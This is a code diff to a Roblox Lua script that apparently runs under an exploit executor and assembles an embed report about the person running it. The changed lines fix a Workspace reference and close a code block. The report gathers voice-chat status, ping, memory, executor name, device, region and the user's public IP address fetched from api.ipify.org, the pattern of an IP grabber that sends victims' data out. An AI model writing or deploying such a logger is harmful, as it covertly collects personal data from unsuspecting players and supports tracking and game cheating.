@@ -10,6 +10,7 @@ local http = (syn and syn.request) or http and http.request or http_request or (
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local GroupService = game:GetService("GroupService")
+local workspace = game:GetService("Workspace")
 local HTMLcolors = { 
     ["Red"] = "rgb(255, 0, 0)",
     ["Yellow"] = "rgb(255, 255, 0)",
@@ -2025,7 +2026,7 @@ local embed = {
         },
 	{
 	    ["name"] = "Client Information",
-	    ["value"] = "```\n- Voice chat enabled: " .. vcenab() .. "\n- FPS: " .. math.floor(Workspace:GetRealPhysicsFPS()) .. "\n- Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n- Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n- Exploit: " .. Exploit() .. "\n- Device: " .. DeviceInfo() .. "\n- User region: " .. Virtual_Region() .. "\n- Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true))
+	    ["value"] = "```\n- Voice chat enabled: " .. vcenab() .. "\n- FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n- Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n- Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n- Exploit: " .. Exploit() .. "\n- Device: " .. DeviceInfo() .. "\n- User region: " .. Virtual_Region() .. "\n- Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
         },
     ["footer"] = {
         ["text"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " ) | " .. tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region()
